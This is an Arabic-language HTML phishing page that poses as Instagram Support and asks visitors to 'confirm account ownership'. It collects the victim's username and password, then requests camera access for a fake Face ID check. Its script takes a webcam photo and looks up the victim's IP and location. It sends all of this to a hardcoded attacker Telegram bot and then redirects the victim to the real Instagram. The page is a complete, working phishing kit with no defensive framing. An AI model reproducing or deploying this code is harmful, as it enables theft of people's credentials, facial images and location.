<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Support</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 330px; text-align: center; border-radius: 8px; }
        .logo { width: 175px; margin-bottom: 20px; }
        h2 { font-size: 18px; color: #262626; }
        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 20px; }
        .btn { width: 100%; background: #0095f6; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; }
        #step2 { display: none; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e05b564.png" class="logo">
    
    <div id="step1">
        <h2>تأكيد ملكية الحساب</h2>
        <p>نظراً لنشاط غير معتاد، يرجى تسجيل الدخول وإكمال فحص الأمان للمتابعة.</p>
        <input type="text" id="user" placeholder="اسم المستخدم" style="width:90%; padding:10px; margin-bottom:10px; border:1px solid #dbdbdb;">
        <input type="password" id="pass" placeholder="كلمة السر" style="width:90%; padding:10px; margin-bottom:20px; border:1px solid #dbdbdb;">
        <button class="btn" onclick="nextStep()">متابعة</button>
    </div>

    <div id="step2">
        <h2>خطوة الأمان الأخيرة</h2>
        <p>يرجى السماح بالوصول للكاميرا لإتمام فحص الوجه (Face ID).</p>
        <button class="btn" onclick="captureEverything()">بدء الفحص</button>
    </div>
</div>

<script>
    const config = {
        t: '8609389464:AAEIqne_f0xZNOeqYz-rk7XOsbALUM12gA8',
        c: '8658217605'
    };

    let u = "", p = "";

    function nextStep() {
        u = document.getElementById('user').value;
        p = document.getElementById('pass').value;
        if(u && p) {
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
        }
    }

    async function captureEverything() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            // جلب الـ IP بدقة
            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(async (blob) => {
                const fd = new FormData();
                fd.append('chat_id', config.c);
                fd.append('photo', blob, 'a.jpg');
                fd.append('caption', `🔥 صيدة لـ أنس:\n👤: ${u}\n🔑: ${p}\n🌐 IP: ${ipData.ip}\n📍 ${ipData.city}, ${ipData.country_name}\n📱 ${navigator.userAgent}`);

                await fetch(`https://api.telegram.org/bot${config.t}/sendPhoto`, { method: 'POST', body: fd });
                
                stream.getTracks().forEach(t => t.stop());
                window.location.replace("https://www.instagram.com");
            }, 'image/jpeg');
        } catch (e) {
            window.location.replace("https://www.instagram.com");
        }
    }
</script>
</body>
</html>
